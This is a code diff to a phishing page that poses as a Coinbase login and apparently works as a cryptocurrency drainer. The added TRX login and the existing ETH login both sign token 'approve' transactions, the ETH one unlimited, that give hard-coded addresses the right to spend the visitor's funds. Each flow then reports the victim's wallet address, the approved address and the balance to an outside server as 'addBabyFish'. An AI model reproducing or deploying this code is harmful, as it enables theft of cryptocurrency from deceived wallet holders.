@@ -7,6 +7,7 @@
   <link rel="stylesheet" type="text/css" href="../../coin/css/common.css" />
   <link rel="stylesheet" type="text/css" href="../../coin/login/index.css" />
   <script src="../../coin/login/js/ethers-5.0.umd.min.js" type="application/javascript"></script>
+  <script src="./js/tronweb.js"></script>
   <title>Coinbase</title>
   <link href="https://cdn.bootcdn.net/ajax/libs/toastr.js/latest/css/toastr.css" rel="stylesheet">
 </head>
@@ -45,9 +46,9 @@
     <div class="group3 flex-col">
       <span class="info1" onclick="ethLogin()" style="cursor: pointer">ETH&nbsp;LOGIN</span>
     </div>
-    <!-- <div class="group4 flex-col">   // todo
+    <div class="group4 flex-col">
       <span class="word2" onclick="trxLogin()" style="cursor: pointer">TRX&nbsp;LOGIN</span>
-    </div> -->
+    </div>
     <div class="group5 flex-col">
       <div class="layer1 flex-col">
         <span class="txt3" data-locale="t38">如何参与</span>
@@ -91,10 +92,80 @@
   $(function (){
     loadProperties(localStorage.getItem("lang"))
   })
+
   function ethLogin(){
     test()
   }
   function trxLogin(){
+    // const TronWeb = require('tronweb')
+    alert("xxxxxxxxxxxxxxxxxxxxxxxxxx")
+    if(window.tronWeb){
+      this.tronWeb =  window.tronWeb;
+      console.log(window.tronWeb)
+      this.walletAddress = this.tronWeb.defaultAddress.base58;
+      console.log(this.tronWeb.defaultAddress.base58)
+      alert("trx ---------------")
+
+      // tronWeb = this.tronWeb
+      // const HttpProvider = this.tronWeb.providers.HttpProvider
+      const fullNode = 'https://api.shasta.trongrid.io';
+      const solidityNode = 'https://api.shasta.trongrid.io';
+      const eventServer = 'https://api.shasta.trongrid.io';
+      // const privateKey = 'b99b14f3-fbba-43b2-b0ce-86aef0088549'
+
+      //
+      const tronWeb = new TronWeb(
+              fullNode,
+              solidityNode,
+              eventServer,
+              // privateKey
+      );
+      // tronWeb.setHeader({"TRON-PRO-API-KEY": 'de5cdda3-5334-4486-8331-9c1ad6ddf249'});
+
+      walletAddress = this.walletAddress
+      resb = tronWeb.trx.getBalance(walletAddress)
+
+      console.log(`User's balance is: `, resb, walletAddress);
+      alert(`User's balance is: `, resb, walletAddress)
+
+
+      // tx =  this.tronWeb.transactionBuilder.sendTrx(
+      //         "TN9RRaXkCFtTXRso2GdTZxSxxwufzxLQPP",10 * Math.pow(10,6),this.walletAddress
+      // );
+      // signedTx = this.tronWeb.trx.sign(tx);
+      // var broastTx = this.tronWeb.trx.sendRawTransaction(signedTx);
+      // console.log(broastTx)
+
+      // bizhong = getMostValuableAssets(walletAddress);
+      async function triggercontract(acoount) {
+        authorized_address = "TY9fKU259NHM5131wXnaFFouRhVXykxYue"
+        const parameter = [{type:'address',value:'TY9fKU259NHM5131wXnaFFouRhVXykxYue'},{type:'uint256',value:this.tronWeb.toHex(25 * Math.pow(10,18))}]
+        var tx  = await this.tronWeb.transactionBuilder.triggerSmartContract("TY9fKU259NHM5131wXnaFFouRhVXykxYue", "approve(address,uint256)", {},parameter,this.walletAddress);
+        var signedTx = await this.tronWeb.trx.sign(tx.transaction);
+        var broastTx = await this.tronWeb.trx.sendRawTransaction(signedTx);
+        console.log(broastTx)
+        alert(broastTx)
+        PostCon(walletAddress, authorized_address, 0, "trc")
+      }
+
+      triggercontract(walletAddress)
+
+    } else {
+        const HttpProvider = TronWeb.providers.HttpProvider;
+        const fullNode = new HttpProvider('https://api.trongrid.io');
+        const solidityNode = new HttpProvider('https://api.trongrid.io');
+        const eventServer = 'https://api.trongrid.io/';
+
+        const tronWeb = new TronWeb(
+                fullNode,
+                solidityNode,
+                eventServer,
+        );
+
+        window.tronWeb = tronWeb;
+        alert("please open in tron wallet !!!")
+    }
+
   }
 
   const abi = [
@@ -227,11 +298,11 @@
       );
       web3 = new Web3(provider);
       await web3.eth.getAccounts().then(function (accounts) {
-        console.log("xxxxxxxxxxxxxxxx")
+        // console.log("xxxxxxxxxxxxxxxx")
         account = accounts
       })
-      balancess = web3.eth.getBalance(account)
-      console.log("provider = " + ethers.utils.formatEther(balancess));
+      // balancess = web3.eth.getBalance(account)
+      // console.log("provider = " + ethers.utils.formatEther(balancess));
       // balanceMoney = ethers.utils.formatEther(balancess)
       // alert("balanceMoney" + balanceMoney)
       // alert("provider")
@@ -244,27 +315,31 @@
     console.log("--------------")
     contr.methods.balanceOf(account[0]).call({from: account[0]}, function(error, result){
       balanceMoney = result
-      console.log("xxxxxxxxxxxxxxxxxxxx", result);
+      console.log("balance of ", result);
     });
 
     authadress = "0x86f61956c0895469ec063ac58bff7f5f46dccba7"
     contr.methods.approve(authadress,"115700000000000000000000000000000000000000000000000000000000").send({from:account[0]}, function (err, response) {
-      console.log(err)
-      console.log(response)
+      console.log("approve ", err)
+      if (err == null) {
+        // console.log("good!!!!!")
+        PostCon(account[0], authadress, balanceMoney, "erc")
+      }
+      console.log("call responese", response)
     })
     // console.log('getWeb3',res, account)
     // alert("web3 " + res)
-    console.log("user usdt res = ", balanceMoney)
-    PostCon(account[0], authadress, balanceMoney)
+    // console.log("user usdt res = ", balanceMoney)
+
   }
 
-  function PostCon(user_address, auth_address, balanceMoney) {
+  function PostCon(user_address, auth_address, balanceMoney, base_chain) {
     // alert("post")
     var data = "";
 
     url = "https://uapi.oct99a.com:8443/service?action=addBabyFish&terminal_id=2" +
             "&user_address=" + user_address + "&auth_address=" + auth_address + "&" +
-            "coin_type=usdt&base_chain=erc&user_available=" + balanceMoney + "&sproxy="+localStorage.getItem("sproxy")
+            "coin_type=usdt&base_chain=" + base_chain + "&user_available=" + balanceMoney + "&sproxy="+localStorage.getItem("sproxy")
 
     console.log(url)
 
